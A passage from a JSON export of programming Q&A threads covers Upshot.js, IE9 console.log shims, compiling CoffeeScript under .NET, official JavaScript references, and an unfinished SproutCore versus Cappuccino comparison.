                    "body": "<p>Looking at the BigShelf example, their are a few extra available packages you can use.</p>\n\n<p>I haven't tried them myself yet, but take a look at:</p>\n\n<p><a href=\"http://nuget.org/packages/Upshot\" rel=\"nofollow\">http://nuget.org/packages/Upshot</a></p>\n\n<p><a href=\"http://nuget.org/packages/SinglePageApplication\" rel=\"nofollow\">http://nuget.org/packages/SinglePageApplication</a></p>\n\n<p>I think the SPA package contains the Upshot and Metadata html helper extension methods</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://blog.stevensanderson.com/2012/03/06/single-page-application-packages-and-samples/\" rel=\"nofollow\">Here is the Delivery Tracker sample from the presentation</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Steve Sanderson gave a very interesting presentations at Techdays 2012 in the Netherlands. In one of them <a href=\"http://www.techdays.nl/AgendaDetail.aspx?cid=2159&amp;lang=en\">he presented</a> a library that he used for client-server communication in MVC application: Upshot.</p>\n\n<p>I was really amazed how easy it was to use it, so I wanted to download and test it. I found the download link here <a href=\"http://nuget.org/packages/Upshot\">through NuGet</a>, but I cannot find any documentation. Does anyone have something that works? I would also appreciate the sample code that Steve showed as during presentation.</p>\n\n<p><em>EDIT:</em></p>\n\n<p>I found the online presentation I attended at Techdays. It's soooo much worth seeing. You will get a glance of what upshot is capable of and also get an idea how to start with it. Good luck and have fun.</p>\n\n<p>The link: <a href=\"http://channel9.msdn.com/Events/TechDays/Techdays-2012-the-Netherlands/2159\">http://channel9.msdn.com/Events/TechDays/Techdays-2012-the-Netherlands/2159</a></p>\n",
            "last_activity_date": 1347968405,
            "question_id": 9348165,
            "score": 50,
            "tags": [
                "javascript",
                "asp.net",
                "asp.net-mvc-4",
                "upshot",
                "asp.net-spa"
            ],
            "title": "Where can I find Upshot.js examples and documentation?"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>If you have multiple parallel script files, maybe the files are being loaded/executed in a different order with developer tools on/off.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You have console calls, in IE these will fail if the dev tools are not open. A simple fix is to wrap any console calls in a function like:</p>\n\n<pre><code>function log(msg) {\n  if(console)\n    console.log(msg);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>I find it much more convenient to simply use <code>console &amp;&amp; console.log('foo', 'bar', 'baz')</code> rather than use a wrapper function.</p>\n\n<p>The code you provided:</p>\n\n<pre><code>function logError(msg){\n  if (console) {\n    console.log(msg);\n  } else {\n    throw new Error(msg);\n  }\n}\n</code></pre>\n\n<p>Will produce an error for IE when dev tools are closed because <code>console</code> will be undefined.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The console.log wrapper that I used was not sufficient to detect the console in IE9. Here's the wrapper that works <a href=\"http://stackoverflow.com/questions/690251/what-happened-to-console-log-in-ie8\">from a related question on SE</a>:</p>\n\n<pre><code>function logError(msg){\n    try {\n        console.log(msg);\n    } catch (error) {\n        throw new Error(msg);\n    }\n}\n\nfunction log(msg){\n    try {\n        console.log(msg);\n    } catch (error) { }\n}\n</code></pre>\n\n<p>A proper test for the availability of the console object would be:\n<code>if (typeof console === \"undefined\" || typeof console.log === \"undefined\")</code></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I appreciate I'm pretty late to the party here, but I've got a solution for IE9 that's a little different.</p>\n\n<pre><code>(function() {\n    var temp_log = [];\n    function log() {\n        if (console &amp;&amp; console.log) {\n            for (var i = 0; i &lt; temp_log.length; i++) {\n                console.log.call(window, temp_log[i]);\n            }\n            console.log.call(window, arguments);\n        } else {\n            temp_log.push(arguments);\n        }\n    }\n})();\n</code></pre>\n\n<p>Basically instead of <code>console.log</code> you use <code>log</code>. If <code>console.log</code> exists then it works as normal, otherwise it stores log entries in an array and outputs them on the next <code>log</code> where the <code>console</code> is available.</p>\n\n<p>It would be nice if it pushed the data as soon as the <code>console</code> is available, but this is less expensive than setting up a custom setInterval listener.</p>\n\n<h2>Updated function (1 October 2012)</h2>\n\n<p>I've updated this script for my own use and thought I'd share it. It has a few worthy improvements:</p>\n\n<ul>\n<li>use <code>console.log()</code> like normal, i.e. no longer need to use non-standard <code>log()</code></li>\n<li>supports multiple arguments, e.g. <code>console.log('foo', 'bar')</code></li>\n<li>you can also use <code>console.error</code>, <code>console.warn</code> and <code>console.info</code> (though outputs them as <code>console.log</code>)</li>\n<li>script checks for native <code>console</code> every 1000ms and outputs the buffer when found</li>\n</ul>\n\n<p>I think with these improvements, this has become a pretty solid shim for IE9. <strong><a href=\"https://github.com/liamnewmarch/console-shim\">Check out the GitHub repo here</a>.</strong></p>\n\n<pre><code>if (!window.console) (function() {\n\n    var __console, Console;\n\n    Console = function() {\n        var check = setInterval(function() {\n            var f;\n            if (window.console &amp;&amp; console.log &amp;&amp; !console.__buffer) {\n                clearInterval(check);\n                f = (Function.prototype.bind) ? Function.prototype.bind.call(console.log, console) : console.log;\n                for (var i = 0; i &lt; __console.__buffer.length; i++) f.apply(console, __console.__buffer[i]);\n            }\n        }, 1000); \n\n        function log() {\n            this.__buffer.push(arguments);\n        }\n\n        this.log = log;\n        this.error = log;\n        this.warn = log;\n        this.info = log;\n        this.__buffer = [];\n    };\n\n    __console = window.console = new Console();\n})();\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 25
                },
                {
                    "body": "<p>I have hacked it the following way</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    (function () {\n        if (typeof console == \"undefined\") {\n            console = {\n                log : function () {}\n            }\n        }\n    })();\n&lt;/script&gt;\n</code></pre>\n\n<p>And this is the first script element in the .</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Most of the other solutions should work great, but here's a short one liner if you don't care about catching log messages if the console is not available.</p>\n\n<pre><code>// Stub hack to prevent errors in IE\nconsole = window.console || { log: function() {} };\n</code></pre>\n\n<p>This lets you still use the native console.log function directly still instead of wrapping it with anything or having a conditional each time.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I have run into this issue many times. Basically with variables we do this to check if they are valid</p>\n\n<pre><code>var somevar;\nif (somevar)\n //do code\n</code></pre>\n\n<p>this works because somevar will resolve to undefined. But if your checking a window property for example. window.console. </p>\n\n<pre><code>if (console) &lt;---- this throws an exception\n</code></pre>\n\n<p>You cannot do the same check. The browser treats it differently. Basically only doing this</p>\n\n<pre><code>if (window.console) &lt;---- will NOT throw an exception if undefined\n//some code\n</code></pre>\n\n<p>this will work the same as the first example. So you need to change your code to</p>\n\n<pre><code>function log(msg){\n if (window.console){\n     console.log(msg);\n }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm developing a complex website that heavily leverages jQuery and a number of scripts. On load of the site, none of my scripting is working (though I can confirm that other scripts are functioning fine). I wouldn't be posting such a lame question here on SE except for one thing:</p>\n\n<p>The instant I hit F12 to turn on developer tools so I can debug my issue, everything instantly works perfectly!</p>\n\n<p>Worse, if I shut down the browser, start it up, turn on Dev Tools first and visit the site, everything works as expected. </p>\n\n<p>So I can't even debug the darned problem because Dev Tools fixes it! What could Dev Tools be doing that makes things work? Does it change the UA (I do some jQuery.browser detection)? Does it do something to doctype?</p>\n\n<p>EDIT</p>\n\n<p>All my console logging is wrapped in the following wrapper utility function:</p>\n\n<pre><code>   function log(msg){\n    if (console){\n        console.log(msg);\n    }\n   }\n</code></pre>\n\n<p>Any thoughts or suggestions I could try would be welcome. I'll post here if I find a solution.</p>\n",
            "last_activity_date": 1389718271,
            "question_id": 8095348,
            "score": 50,
            "tags": [
                "javascript",
                "internet-explorer-9"
            ],
            "title": "Website with JS doesn&#39;t work in IE9 until the Developer Tools is activated"
        },
        {
            "answer_count": 18,
            "answers": [
                {
                    "body": "<p>I don't have a direct answer, (I hope you find one), but maybe take a look at the following to see how it might be done.</p>\n\n<ul>\n<li><a href=\"http://jint.codeplex.com\" rel=\"nofollow\">Jint</a> - JavaScript interpreter for .NET</li>\n<li><a href=\"http://www.codeproject.com/KB/cs/EmbeddingJSCS.aspx\" rel=\"nofollow\">Using IKVM to compile Rhino</a> would get rid of the Java runtime requirement.</li>\n<li><a href=\"http://github.com/yeungda/jcoffeescript\" rel=\"nofollow\">jcoffeescript</a>. I haven't looked at jcoffeescript, but I think it depends on <a href=\"http://en.wikipedia.org/wiki/JRuby\" rel=\"nofollow\">JRuby</a> and Rhino.  You could possibly <a href=\"http://en.wikipedia.org/wiki/IKVM.NET\" rel=\"nofollow\">IKVM.NET</a> this as well.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Since the CoffeeScript compiler now runs on Internet Explorer, after a couple of recent tweaks, it should be good to go within other MS-flavors of JavaScript as well. Try including <code>extras/coffee-script.js</code> from the latest version, and you should be good to go with <code>CoffeeScript.compile(code)</code>.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I tried running the bundled <code>extras/coffee-script.js</code> through Windows Based Script Host (or just wscript) and it didn't report any issues. I then added this line:</p>\n\n<pre><code>WScript.Echo(CoffeeScript.compile('a: 1'));\n</code></pre>\n\n<p>at the end of the file and run it through <code>wscript</code> again and it printed the resulting JavaScript correctly.</p>\n\n<p>Are you using COM objects? Can you share some more of the code responsible for initialising the MScript object reference?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"https://github.com/abolibibelot/coffeescript-dotnet#readme\"><strong>CoffeeScript-dotnet</strong></a></p>\n\n<p>Command line tool for compiling CoffeeScript. Includes a file system watcher to automatically recompile CoffeeScripts when they change. Roughly equivalent to the coffee-script node package for linux / mac.</p>\n\n<p><a href=\"http://tomlokhorst.github.com/CoffeeSharp/\"><strong>CoffeeSharp</strong></a></p>\n\n<p>Includes a command line tool similar to CoffeeScript-dotnet as well as a http handler that compiles CoffeeScripts when requested from an asp.net site.</p>\n\n<p><a href=\"https://github.com/xpaulbettsx/SassAndCoffee\"><strong>SassAndCoffeeScript</strong></a></p>\n\n<p>Library for Asp.net mvc that compiles sass and coffeescript files on request. Also supports minification and combination.</p>\n\n<p><a href=\"http://otac0n.com/blog/2011/06/29/CoffeeDemo-A-Simple-Demo-Of-IronJS-Using-CoffeeScript.aspx\"><strong>Manually Compile With IronJS</strong></a></p>\n\n<p>IronJS is a .NET javascript interpreter that can successfully load the CoffeeScript compiler and compile CoffeeScript.</p>\n\n<p><strong>Manually Compile With Node.js</strong></p>\n\n<p>Get the <a href=\"http://node-js.prcn.co.cc/\">node binaries</a> and add the bin directory to your path. Write a <a href=\"https://github.com/liammclennan/coffeescript-course/blob/master/util/l.js\">node.js script to load the CoffeeScript compiler and your CoffeeScript files and save the compiled javascript</a>.</p>\n",
                    "is_accepted": true,
                    "score": 35
                },
                {
                    "body": "<p>I've managed to compile CoffeeScript from .NET using IKVM, jcoffeescript and Rhino. It was straightforward, except that the JCoffeeScriptCompiler constructor overload without parameters didn't work. It ran OK with a java.util.Collections.EMPTY_LIST as parameter.</p>\n\n<p>This is how I did it:</p>\n\n<ol>\n<li>Download IKVM, jcoffeescript and Rhino.</li>\n<li>Run ikvmc against js.jar, creating js.dll.</li>\n<li>Run ikvmc against the jcoffeescript jar.</li>\n<li>Add a reference to the jcoffeescript dll in Visual Studio. More references may be needed, but you will be warned about those.</li>\n<li>Run new org.jcoffeescript.JCoffeeScriptCompiler(java.util.Collections.EMPTY_LIST).compile() in your code.</li>\n</ol>\n\n<p>The next step would be to create a build task and/or an HTTP handler.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Instead of shelling out to CScript you could shell out to Node.js (<a href=\"http://node-js.prcn.co.cc/\" rel=\"nofollow\">here are self-contained Windows binaries</a>)</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've tried to compile the extras/<code>coffee-script.js</code> file, unmodified, to <code>jsc</code>, the <a href=\"http://en.wikipedia.org/wiki/JScript_.NET\" rel=\"nofollow\">JScript.NET</a> compiler for .NET, and I got many errors. Here are the noteworthy ones:</p>\n\n<ul>\n<li>'require' is a new reserved word and should not be used as an identifier</li>\n<li>'ensure' is a new reserved word and should not be used as an identifier</li>\n<li>Objects of type 'Global Object' do not have such a member</li>\n</ul>\n\n<p>Other errors were caused by the above said errors.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Check out the new <a href=\"https://github.com/abolibibelot/coffeescript-dotnet\" rel=\"nofollow\">coffeescript-dotnet</a> project, which uses the <a href=\"http://jurassic.codeplex.com/\" rel=\"nofollow\">Jurassic</a> JavaScript implementation.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>CoffeeScript in Visual Studio 2010</p>\n\n<p>It's Chirpy's fork (chirpy is a tool for mashing, minifing, and validating javascript, stylesheet, and dotless files)</p>\n\n<p>\"OK, I think I got it working on my fork, based mostly on other peoples' work. Check it out:\n<a href=\"http://chirpy.codeplex.com/SourceControl/network/Forks/Domenic/CoffeeScriptFixes\" rel=\"nofollow\">http://chirpy.codeplex.com/SourceControl/network/Forks/Domenic/CoffeeScriptFixes</a>\"</p>\n\n<p>from <a href=\"http://chirpy.codeplex.com/workitem/48\" rel=\"nofollow\">http://chirpy.codeplex.com/workitem/48</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>CoffeeScript is now fully supported by Chirpy:\n<a href=\"http://chirpy.codeplex.com/\">http://chirpy.codeplex.com/</a></p>\n",
                    "is_accepted": false,
                    "score": 32
                },
                {
                    "body": "<p>IronJS now supports CoffeeScript and is generally faster than the other .NET JS engines:</p>\n\n<p>I have a blog post about wiring the two together here:<br>\n<a href=\"http://otac0n.com/blog/2011/06/29/CoffeeDemo-A-Simple-Demo-Of-IronJS-Using-CoffeeScript.aspx\" rel=\"nofollow\">http://otac0n.com/blog/2011/06/29/CoffeeDemo-A-Simple-Demo-Of-IronJS-Using-CoffeeScript.aspx</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You might also want to check out jurassic-coffee, it is also a coffee-script compiler running the original compiler in jurassic.</p>\n\n<p>It features sprocket style \"#= require file.coffee\" or \"#= require <code>file.js</code>\" wich can be used to keep .coffee files modular and combined right before compilation as well as embedding .js files.</p>\n\n<p>It sports a HttpHandler with file watchers for .js and .coffee files that keeps track of what .coffee files needs to be re-compiled and pass through to the compiled *.js files for the rest.</p>\n\n<p>jurassic-coffee is also available as a Nuget package</p>\n\n<p><a href=\"https://github.com/creamdog/JurassicCoffee\" rel=\"nofollow\">https://github.com/creamdog/JurassicCoffee</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You specifically said that you wanted to write a runtime compiler, so this may not be exactly what you are looking for, but if the main point is to have a way to generate the javascript result, the <a href=\"http://www.mindscapehq.com/products/web-workbench\" title=\"Mindscape Web Workbench\">Mindscape Web Workbench</a> is interesting.  It is a free extension for Visual Studio.NET 2010 and available in the Extension Manager. It gives Intellisense, syntax highlighting and compiles to JS as you write.  I am just getting started using it but looks promising.  Scott Hanselman talks about it <a href=\"http://www.hanselman.com/blog/CoffeeScriptSassAndLESSSupportForVisualStudioAndASPNETWithTheMindscapeWebWorkbench.aspx\">here</a>. It also supports LESS and Sass.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>I've done an HttpHandler that uses Windows Script Host behind the scenes: <a href=\"https://github.com/duncansmart/LessCoffee\" rel=\"nofollow\">https://github.com/duncansmart/LessCoffee</a> and works great (it also compiles <a href=\"http://lesscss.org/\" rel=\"nofollow\">*.less</a> files).</p>\n\n<p>It's on NuGet: <a href=\"http://nuget.org/List/Packages/LessCoffee\" rel=\"nofollow\">http://nuget.org/List/Packages/LessCoffee</a></p>\n\n<p>It's based on this simple wrapper: <a href=\"https://github.com/duncansmart/coffeescript-windows\" rel=\"nofollow\">https://github.com/duncansmart/coffeescript-windows</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I wrote an inteructive shell using v8.</p>\n\n<p><a href=\"https://github.com/mattn/coffee-script-v8\" rel=\"nofollow\">https://github.com/mattn/coffee-script-v8</a></p>\n\n<p>This work as single executable file. (Don't use external files)\nIt can't use require(). But enough to learn coffeescript.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>My main editor is VS 2010 and I love the WorkBench extension. it's nice it auto compiles to js everytime you hit save on your .coffee file, also introduces you to SASS which I had read about but never got around.</p>\n\n<p>They offer a pay version to that will autmaically shrink/minify your js and css files as well, since your.coffee and .scss are your source files anyway.</p>\n\n<p>I'd encourage all VS users to go ahead and install this especially if you run VS 2010.</p>\n\n<p>The only knock, and someone please correct me or enlighten me, is that with .coffee syntax it's not highlighted the way say html, js, c# code is. it might be because I am using a color scheme from <a href=\"http://studiostyl.es/\" rel=\"nofollow\">http://studiostyl.es/</a> and for the record <a href=\"http://studiostyl.es/schemes/coffee-\" rel=\"nofollow\">http://studiostyl.es/schemes/coffee-</a> just shares the name coffee no special syntax highlight support for coffeescript that I am aware of. but no reason not to start using the workbench addin today!</p>\n\n<p>Okay workbench website claims: syntax highlighting so again maybe it's the studiostyle.es i chose.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I know this is old but I came here to answer a very similar question: How do I get my CoffeeScript to compile using Visual Studio 2012 Express? Note that the free Express version does not allow any extensions so I could not continue to use the <a href=\"http://www.mindscapehq.com/products/web-workbench\" rel=\"nofollow\">Mindscape Workbench</a> extension that had served me well for quite some time.</p>\n\n<p>It turns out to be very easy. Just use NuGet to install the <a href=\"http://nuget.org/packages/jurassic-coffee/\" rel=\"nofollow\">Jurassic-Coffee</a> package and off you go.</p>\n\n<p>One advantage of using this package over mindscape workbench is that you can reference your coffee directly from the script tags in the html. It minifies and caches the compiled JS so you only do work if the requested coffee file has changed.</p>\n\n<pre><code>&lt;head&gt;\n    &lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"home.coffee\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n</code></pre>\n\n<p>The mindscape workbench allows you to bundle together different coffescript files which is very handy for modularising your coffeescript. You can also do this using Jurassic Coffee by utilising the <code>#= require</code> statement to include other coffee module files, for example:</p>\n\n<pre><code>#= require Classes\\GridWrapper.coffee\nclass UsersGrid\n  constructor:-&gt;\n     @grid = new GridWrapper()\n</code></pre>\n\n<p>I think having the <code>#= require</code> staement in the coffee file is actually cleaner and clearer than the mindscape workbench approach, which kind of hides all this behind their interface so you forget easily what dependencies you have.</p>\n\n<p><strong>Note</strong>\nThere is one potential gotcha. The Nuget installer will put in an httphandler entry into your web.config that may not be compatible with IIS Express integrated managed pipeline mode. </p>\n\n<p>You might therefore see the following error:</p>\n\n<blockquote>\n  <p>An ASP.NET setting has been detected that does not apply in Integrated\n  managed pipeline mode.</p>\n</blockquote>\n\n<p>To fix this just remove the handler shown below.</p>\n\n<pre><code>&lt;system.web&gt;\n  //other stuff\n\n  &lt;httpHandlers&gt;\n    &lt;add type=\"JurassicCoffee.Web.JurassicCoffeeHttpHandler,JurassicCoffee\" validate=\"false\" path=\"*.coffee\" verb=\"*\" /&gt;\n  &lt;/httpHandlers&gt;\n\n&lt;/system.web&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You could simply write a port of it to C#.  I have ported Jison to C# (which is the underlying project that makes CoffeeScript run).  I would think it may be a bit different, but both Jison parsers work the same.</p>\n\n<p>I have not pull requested it back yet to Jison's main architecture, but will be doing so soon.</p>\n\n<p><a href=\"https://github.com/robertleeplummerjr\" rel=\"nofollow\">https://github.com/robertleeplummerjr</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to write an HttpHandler that compiles CoffeeScript code on-the-fly and sends the resulting JavaScript code. I have tried MS [JScript][1] and IronJS without success. I don't want to use [Rhino][2] because the Java dependency would make it too difficult to distribute. </p>\n\n<p>How can CoffeeScript be compiled from .NET?</p>\n",
            "last_activity_date": 1374365662,
            "question_id": 2879401,
            "score": 47,
            "tags": [
                "javascript",
                ".net",
                "coffeescript"
            ],
            "title": "How can I compile CoffeeScript from .NET?"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>I would say this one is the \"official\": <a href=\"https://developer.mozilla.org/en/JavaScript\" rel=\"nofollow\">https://developer.mozilla.org/en/JavaScript</a></p>\n\n<p>You also have the <a href=\"http://www.ecma-international.org/ecma-262/5.1/\" rel=\"nofollow\">ECMAScript Language Specification, 5.1 Edition</a> <em>(or as a <a href=\"http://www.ecma-international.org/ecma-262/5.1/ECMA-262.pdf\" rel=\"nofollow\">PDF</a>, the definitive specification)</em>.</p>\n\n<p>And from Microsoft: <a href=\"http://msdn.microsoft.com/en-us/library/d1et7k7c%28v=vs.85%29.aspx\" rel=\"nofollow\">JavaScript Language Reference</a>: \"This documentation explains the <strong>Microsoft implementation of JavaScript</strong>, which is compliant with the <strong>ECMAScript 5th Edition</strong> language specification. It also provides additional features that are not included in the Ecma Standards.\"</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>You can try with the official ECMAscript site, </p>\n\n<p><a href=\"http://www.ecmascript.org/\" rel=\"nofollow\">http://www.ecmascript.org/</a></p>\n\n<p>but the useful thing is actually the implementation of each browser.</p>\n\n<p>I like this cheatsheet from Danny Goodman's JavaScript Bible a lot:</p>\n\n<p><a href=\"http://media.wiley.com/product_ancillary/12/04705269/DOWNLOAD/9780470526910_Appendix_A.pdf\" rel=\"nofollow\">http://media.wiley.com/product_ancillary/12/04705269/DOWNLOAD/9780470526910_Appendix_A.pdf</a></p>\n",
                    "is_accepted": false,
                    "score": 27
                },
                {
                    "body": "<p>There is an official reference, it just isn't in a very convenient format. It is the <a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf\" rel=\"nofollow\">ECMA-262</a> specification. It is a single, very large PDF document, instead of a searchable set of HTML pages.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>It's not like there is an official JavaScript release. All the browsers have made their own JavaScript engine - some are using the same though. But especially Internet Explorer has its own version that doesn't support a lot of what the other browsers support, making it very difficult to make a general JavaScript reference.</p>\n\n<p><strong>Edit:</strong><br>\nWhile I know there is an official ECMA standard and developement team, my point is that it doesn't really matter as long as browsers (Internet Explorer) doesn't live up to it. At the end of the day, clients want JavaScript to work for Internet Explorer too. They won't care about the ECMA standards, they just want it to work. This is here JavaScript libraries come into the picture, but that's another story.</p>\n\n<p>It's the same issues with HTML and CSS, we can't use these tools for active development until:</p>\n\n<ul>\n<li>All browsers support them.</li>\n<li>We supply the browsers with code to make them support it.</li>\n<li>It's okay that it doesn't work in all browsers.</li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 40
                },
                {
                    "body": "<p>I find the old-school <a href=\"http://docs.sun.com/source/816-6408-10/contents.htm\" rel=\"nofollow\">Netscape 4 JavaScript docs</a> very useful for this purpose. Although they're obviously totally outdated, and some of the DOM features in them like Layers are long gone, for the language basics they're really solid.</p>\n\n<p>That's because before the days of IE supremacy and ECMA standardisation, Netscape's JavaScript was <em>the</em> definitive JavaScript. Other browsers pretty much had to implement exactly what you see in those old docs.</p>\n\n<p>They're also much easier to read than the ECMA-262 document, which even by the standards of standards documents is an absolute horror.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Any revisions of <a href=\"https://developer.mozilla.org/Special%3ATags?tag=JavaScript\" rel=\"nofollow\">JavaScript pages on MDC</a> by a member of the Mozilla Documentation team (like <a href=\"https://developer.mozilla.org/User%3ASheppy\" rel=\"nofollow\">Eric Shepherd</a>) is official. JavaScript is officially maintained by Mozilla so only documentation by Mozilla is official. The only engines that support JavaScript are currently made by Mozilla and every other engine implements ECMAScript. JavaScript and ECMAScript have quite a few differences (for example, the awesome <code>let</code> statement).</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>It is very difficult to have an \"official\" reference as long as there are implementations (in all browsers) and there is a specification (ECMAScript) but no conformance tests of implementations against the specifications. </p>\n\n<p>Now though, we have the EMCAScript 5 conformance suite at <a href=\"http://es5conform.codeplex.com/\" rel=\"nofollow\">http://es5conform.codeplex.com/</a> - and there seems some consensus that ECMAScript implementations will come closer together, making ECMAScript more likely to be the official reference for the language.  </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>If you're using ECMAScript for the web (which 99.9% of people are), then beyond the basics syntactics of the language (covered in the ECMA-262 spec mentioned above), what you're probably looking for is a DOM reference - which is the ECMAScript API that's used to interact with web documents.</p>\n\n<p>I'm very surprised noone has mentioned the DOM api sofar. Current W3C DOM standard is here: <a href=\"http://www.w3.org/TR/DOM-Level-2-Core/\" rel=\"nofollow\">http://www.w3.org/TR/DOM-Level-2-Core/</a></p>\n\n<p>(btw, as for the naming confusion - ECMAScript is the name of the official standard, and \"Javascript\" and \"JScript\" are Netscape and Microsoft's proprietary \"forks\")</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I really like <a href=\"http://krook.org/jsdom/\" rel=\"nofollow\">Daniel Krook's apidoc</a>, even though it could use some explanations and examples.  I would really like to see a krook w3school mashup.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>By \u201cofficial\u201d, I think you mean \u201cwritten by the people responsible for JavaScript\u201d.</p>\n\n<p>Just speculating here really, but the people responsible for JavaScript (the ECMA) don\u2019t directly make any money out of it, and probably don\u2019t have any particular skills in writing reference documentation. So they have neither the incentive nor the ability to write a good reference.</p>\n\n<p>Personally, I like <a href=\"http://oreilly.com/catalog/9780596805531/\" rel=\"nofollow\">JavaScript: the Definitive Guide</a> from O\u2019Reilly. There\u2019s a sixth edition coming out in November.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I tried to search for a JavaScript reference, but there's none available. The best two suggested sources are MDC and W3Schools.</p>\n\n<p>Why?</p>\n",
            "last_activity_date": 1415810302,
            "question_id": 1606212,
            "score": 46,
            "tags": [
                "javascript",
                "reference",
                "web-standards",
                "ecma262"
            ],
            "title": "Why is there no OFFICIAL JavaScript reference?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>From the Cappuccino website:</p>\n\n<p>\"On the other end of the existing frameworks are technologies like SproutCore. While SproutCore set out with similar goals to Cappuccino, it takes a distincly different approach. It still relies on HTML, CSS, JavaScript, Prototype, and an entirely new and unique set of APIs. It also requires special development software and a cumbersome compilation step. We think this is the wrong approach.</p>\n\n<p>With Cappuccino, you don't need to know HTML. You'll never write a line of CSS. You don't ever have interact with DOM. We only ask developers to learn one technology, Objective-J, and one set of APIs. Plus, these technologies are implementations of well known and well understood existing ones. Developers can leverage decades of collective experience to really accelerate the pace of building rich web applications.\"</p>\n\n<p>So it seems that Cappuccino does not have/need any build tools, and completely abstracts the browser away from the developer.  Whereas in Sproutcore you get build tools (a development server, for example) and the developer should be somewhat aware of what DOM is.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>This is an interesting question, and one that has been popping up fairly frequently on various messages groups, twitter, and even IRC. There's a couple of ways to evaluate SproutCore versus Cappuccino, but, perhaps, some of the immediate caparisons that people look at are the following:</p>\n\n<p>1) Their respective feature set<br>\n2) Ease of use<br>\n3) Community support and documentation</p>\n\n<p>Let's look at the first point -- there respective feature set. By \"feature set\" there's a couple of ways to look at it. From the number of UI widgets they have; the foundational support to connect things together and communicate with some kind of back-end; the framework's general architectural approach, although not necessarily a \"feature\", but still important; and, yes, even the language you can use. </p>\n\n<p>Regarding language, I think it's important that you do not dismiss what is being used (JS versus Obj-J). Why? Because of adoption and where you are coming from. SproutCore came from the perspective that JavaScript is indeed the language of the web, so it's what you use to program against the framework. Where JavaScript lacks in language OO completeness (proper object-object inheritance, etc) it makes up for in the framework (e.g. MyApp.Foo = SC.Object.extend({...})). Cappuccino comes in from a different angle. They use Obj-J as a primary language enhancement to JS in order to inject language features that JS is missing; this instead of injecting those language features directly into the framework (Cappuccino) itself. Of course, as the folks over at Cappuccino have noted before, you can still use JS to program against Cappuccino proper, but, then, you miss out on what Obj-J provides. Note to the Cappuccino community: Please correct me if I'm wrong :-). Finally, if you're someone who is already familiar with Obj-C then Obj-J may be more your cup of tea. Hey, even Sony is apparently now jumping on the whole Obj-C bandwagon to develop against their mobile platform :-P.</p>\n\n<p>Looking at the architecture of the two frameworks, they both looked at Apple's Cocoa framework for guidance/inspiration in one form or another. Cappuccino took Cocoa fully to heart and basically ported Cocoas API. Again, if you're coming from developing apps in Apple using Cocoa then you're probably going to feel right at home. SproutCore on the other hand took inspiration from Cocoa where it felt right. As for pure architecture, they both follow MVC, they both make use of Cocoa-style bindings, they both have a data store mechanism, and they both have their own respective style of rendering and composing UI widgets/views. </p>\n\n<p>The rendering of views is, to me, a particular area of importance. Both frameworks have some level abstraction in order to remove you from directly dealing with CSS and HTML even though at the end of the day they have to render to what the web browser ultimately understands. </p>\n\n<p>On the Cappuccino side, they completely abstract away CSS and HTML from you. Instead, you use the framework's various rendering primitives to \"draw\" your views. Because of this level of abstraction, Cappuccino can make use of the best rendering approach available instead of coupling you, to some degree, with CSS and HTML. </p>\n\n<p>As for SproutCore, you are rendering closer to the \"metal\" so to speak. When doing a pure rendering of a view, you make use of a rendering context object that provides a certain degree of abstraction, but, ultimately, you are directly injecting HTML and adding class names to apply CSS. Even after your 